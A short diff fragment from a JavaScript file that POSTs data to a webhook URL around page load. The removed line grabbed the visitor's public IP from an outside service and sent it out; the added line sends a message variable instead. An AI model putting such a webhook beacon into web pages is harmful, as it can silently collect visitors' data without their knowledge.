@@ -19,7 +19,7 @@
     fetch(whurl, {
       method: "POST",
       headers: { "content-type": "application/json" },
-      body: JSON.stringify(fetch('https://api.ipify.org') .then(data => (data)))
+      body: JSON.stringify(msg)
     });
 
     window.addEventListener("load", function() {
